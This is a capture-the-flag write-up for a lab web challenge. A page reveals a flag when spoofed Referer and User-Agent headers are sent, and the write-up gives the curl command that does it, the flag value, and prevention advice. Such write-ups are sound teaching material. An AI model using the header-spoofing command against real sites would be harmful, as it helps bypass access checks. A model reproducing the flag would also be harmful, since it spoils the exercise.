# HTTP Header Spoofing Vulnerability

## Overview
Access to secret content is possible by faking HTTP headers. The site checks for specific `Referer` and `User-Agent` values to reveal the flag.

---

## How It Works

On the copyright page:
```
http://<IP_ADDRESS>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```
HTML comments in the source say:
- Use Referer: `https://www.nsa.gov/`
- Use User-Agent: `ft_bornToSec`

**Exploit with curl:**
```bash
curl "http://<IP_ADDRESS>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" \
  --user-agent "ft_bornToSec" \
  --referer "https://www.nsa.gov/"
```
Or use a browser extension (like ModHeader) to set these headers and refresh the page.

---

## Flag

`f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

---

## Prevention

1. **Don't rely on headers for security:** Use proper authentication.
2. **Enforce server-side checks:** Control access with sessions or tokens.
3. **WAF:** Block suspicious header manipulation.
4. **Security headers:** Use CSP and other security headers.

---